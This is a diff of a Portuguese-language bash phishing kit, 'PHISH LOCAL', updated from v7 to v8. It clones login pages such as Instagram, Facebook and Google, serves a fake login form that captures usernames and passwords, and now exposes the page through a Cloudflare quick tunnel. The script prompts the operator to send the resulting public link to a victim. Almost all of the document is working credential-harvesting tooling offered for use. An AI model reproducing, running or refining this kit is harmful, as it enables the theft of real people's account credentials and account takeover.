@@ -1,8 +1,8 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISH LOCAL v7 - DuckDNS + Universal
-# Clona QUALQUER site | Link publico bonito
-# Sem root | Sem instalar nada no destino
+# 🎣 PHISH LOCAL v8 - Cloudflare Tunnel
+# Clona QUALQUER site | Link publico gratis
+# Sem root | Sem instalar nada | Sem registro
 # ============================================
 
 SITE_DIR="site_clone"
@@ -20,7 +20,7 @@ fi
 clear
 echo ""
 echo "=========================================="
-echo "     PHISH LOCAL v7 - DuckDNS Edition"
+echo "     PHISH LOCAL v8 - Cloudflare Tunnel"
 echo "=========================================="
 echo ""
 echo "  1) Criar phishing"
@@ -39,6 +39,7 @@ if [ "$MENU" = "1" ]; then
     echo "=========================================="
     echo ""
     echo "Qual site de login voce quer clonar?"
+echo ""
 echo "  - https://www.instagram.com"
 echo "  - https://www.facebook.com"
 echo "  - https://accounts.google.com"
@@ -173,7 +174,7 @@ http.createServer((req,res)=>{
     fs.readFile(f,(er,d)=>{
         if(er){
             res.writeHead(200,{'Content-Type':'text/html'});
-            res.end('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1.0">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}\n.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}\nh1{font-size:44px;font-weight:300;margin-bottom:30px;font-family:"Segoe UI",sans-serif}\ninput{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}\ninput:focus{border-color:#a8a8a8}\nbutton{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}\nbutton:active{background:#1877f2}\n</style></head><body>\n<div class="card"><h1>Login</h1>\n<form method="POST"action="/login">\n<input type="text" name="username" placeholder="Usuario ou email" required>\n<input type="password" name="password" placeholder="Senha" required>\n<button type="submit">Entrar</button>\n</form></div></body></html>');
+            res.end('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1.0">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:-apple_system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}\n.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}\nh1{font-size:44px;font-weight:300;margin-bottom:30px;font-family:"Segoe UI",sans-serif}\ninput{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}\ninput:focus{border-color:#a8a8a8}\nbutton{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}\nbutton:active{background:#1877f2}\n</style></head><body>\n<div class="card"><h1>Login</h1>\n<form method="POST"action="/login">\n<input type="text" name="username" placeholder="Usuario ou email" required>\n<input type="password" name="password" placeholder="Senha" required>\n<button type="submit">Entrar</button>\n</form></div></body></html>');
             return;
         }
         res.writeHead(200,{'Content-Type':MIME[ext]||'application/octet-stream'});
@@ -187,48 +188,72 @@ IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ 
 [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
 [ -z "$IP" ] && IP="127.0.0.1"
 
-# --- DUCKDNS ---
-DUCKDNS_CONFIG="$HOME/.duckdns"
-DUCKDNS_DOMAIN=""
-DUCKDNS_TOKEN=""
+# --- CLOUDFLARE TUNNEL ---
+CF_INSTALLED=false
+if command -v cloudflared &>/dev/null; then
+    CF_INSTALLED=true
+fi
 
 echo ""
 echo "=========================================="
-echo "  DUCKDNS (Link Publico Gratis)"
+echo "  CLOUDFLARE TUNNEL (Link Publico Gratis)"
 echo "=========================================="
 echo ""
-echo "Quer criar um link publico que funciona em QUALQUER lugar?"
-echo "Ex: ${LOCAL_NAME}.duckdns.org"
-echo ""
-echo "  1) Sim, configurar DuckDNS"
-echo "  2) Nao, usar so o IP local"
-echo ""
-echo -n "Escolha: "
-read DUCK_CHOICE
 
-if [ "$DUCK_CHOICE" = "1" ]; then
+if [ "$CF_INSTALLED" = true ]; then
+    echo "[OK] Cloudflared ja instalado!"
     echo ""
-    echo "Para usar DuckDNS:"
-    echo "  1) Crie conta em https://www.duckdns.org (gratis)"
-    echo "  2) Crie um dominio (ex: ${LOCAL_NAME})"
-    echo "  3) Copie seu TOKEN"
+    echo "  1) Usar Cloudflare Tunnel (recomendado)"
+    echo "  2) Usar so o IP local"
     echo ""
-    echo -n "Seu dominio (sem .duckdns.org): "
-    read DUCKDNS_DOMAIN
-    echo -n "Seu token: "
-    read DUCKDNS_TOKEN
+    echo -n "Escolha: "
+    read CF_CHOICE
+else
+    echo "Cloudflared nao instalado."
+    echo ""
+    echo "Para instalar (recomendado):"
+    echo "  pkg install cloudflared"
+    echo ""
+    echo "  1) Instalar cloudflared agora"
+    echo "  2) Usar so o IP local"
+    echo ""
+    echo -n "Escolha: "
+    read CF_CHOICE
 
-    # Salvar config
-    mkdir -p "$DUCKDNS_CONFIG"
-    echo "DOMAIN=$DUCKDNS_DOMAIN" > "$DUCKDNS_CONFIG/config"
-    echo "TOKEN=$DUCKDNS_TOKEN" >> "$DUCKDNS_CONFIG/config"
+    if [ "$CF_CHOICE" = "1" ]; then
+        echo "[...] Instalando cloudflared..."
+        pkg install cloudflared -y 2>/dev/null
+        if command -v cloudflared &>/dev/null; then
+            CF_INSTALLED=true
+            echo "[OK] Instalado!"
+        else
+            echo "[ERRO] Falha na instalacao. Usando IP local."
+            CF_CHOICE=2
+        fi
+    fi
+fi
 
-    # Atualizar DNS
-    RESULT=$(curl -s "https://www.duckdns.org/update?domains=$DUCKDNS_DOMAIN&token=$DUCKDNS_TOKEN&ip=")
-    echo "[$RESULT] DuckDNS atualizado!"
+CF_URL=""
+if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
+    echo ""
+    echo "[...] Criando tunnel..."
+    echo ""
 
-    # Agendar atualizacao automatica
-    echo "*/5 * * * * curl -s \"https://www.duckdns.org/update?domains=$DUCKDNS_DOMAIN&token=$DUCKDNS_TOKEN&ip=\" > /dev/null 2>&1" | crontab -
+    # Rodar cloudflared em background e capturar URL
+    cloudflared tunnel --url "http://localhost:$PORT" > /tmp/cf_tunnel.log 2>&1 &
+    CF_PID=$!
+
+    # Esperar a URL aparecer
+    sleep 5
+    CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
+
+    if [ -n "$CF_URL" ]; then
+        echo "[OK] Tunnel criado!"
+    else
+        echo "[AVISO] Aguardando tunnel..."
+        sleep 5
+        CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log | head -1)
+    fi
 fi
 
 # --- MOSTRAR RESULTADO ---
@@ -240,13 +265,14 @@ echo "=========================================="
 echo ""
 echo "  URL Local:  http://${IP}:${PORT}"
 echo ""
-if [ -n "$DUCKDNS_DOMAIN" ]; then
+if [ -n "$CF_URL" ]; then
     echo "  🔥 URL PUBLICA (funciona em QUALQUER lugar):"
     echo ""
-    echo "    http://${DUCKDNS_DOMAIN}.duckdns.org:${PORT}"
+    echo "    ${CF_URL}"
     echo ""
     echo "  Mande esse link pra pessoa!"
     echo "  Ela acessa de QUALQUER lugar do mundo."
+    echo "  Sem instalar nada, sem registro."
 else
     echo "  Acesse de qualquer dispositivo na mesma rede:"
     echo "  http://${IP}:${PORT}"
@@ -258,6 +284,9 @@ echo "[*] Iniciando servidor..."
 echo ""
 
 REDIRECT="$REDIRECT_URL" PORT="$PORT" node "$SERVER_FILE"
+
+# Parar cloudflared se estiver rodando
+[ -n "$CF_PID" ] && kill $CF_PID 2>/dev/null
 
 echo ""
 echo "[*] Servidor parado."
